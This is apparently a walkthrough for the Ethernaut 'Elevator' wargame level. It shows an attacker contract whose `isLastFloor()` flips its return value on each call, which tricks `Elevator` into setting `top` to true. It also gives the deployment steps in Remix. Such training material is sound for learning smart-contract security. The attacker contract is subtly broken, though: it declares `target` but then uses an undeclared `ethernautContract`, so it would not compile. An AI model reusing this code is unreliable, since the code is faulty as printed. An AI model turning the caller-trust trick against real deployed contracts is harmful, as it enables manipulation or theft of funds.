| This elevator won't let you reach the top of your building. Right?

There are two key parts to this script centered around the concept of `interfaces` that will ultimately define our attack strategy, which I'll lay out shortly.

We have an interface:
```javascript
interface Building {
    function isLastFloor(uint) external returns (bool);
}
```
which is called in the `Elevator` contract:
```javascript
Building building = Building(msg.sender);
```
🤔 hmmm, `Elevator` never implemented the `isLastFloor()` function from the interface. Pretty sure this means we can define our own `isLastFloor()` to hack this thing.

So what do we need to make `isLastFloor()` do? Simple - we make `isLastFloor()` toggle its return to meet the following criteria:
```javascript
// we need to make this check evaluate false
if (! building.isLastFloor(_floor)) {
    floor = _floor;
    // and then make this evaluate true
    top = building.isLastFloor(floor);
}
```

## Solution
1. Head over to Remix, add the `Elevator` contract, then add our malicious contract which instantiates `Elevator` in its constructor:
```javascript
contract upOnly {
    Elevator public target;

    constructor(address _address) public {
        // _address is you ethernaut contract instance
        ethernautContract = Elevator(_address);
    }
}
```
2. Next, we implement our `isLastFloor()` function that will flip `isLastFloorToggle` when called. We also add a function to call the `Elevator`'s `goTo()` which triggers the hack.
```javascript
contract upOnly {
    // ...
    bool lastFloorToggle = true;

    function isLastFloor(uint) public returns(bool) {
        // flip the switch
        lastFloorToggle = !lastFloorToggle;
        return lastFloorToggle;
    }

    // trigger the hack
    function hack() public {
        ethernautContract.goTo(420);
    }
}
```
3. Deploy the `upOnly` contract with your contract instance, call your `hack()` function, then run `await contract.top()`. This should return true - we're done!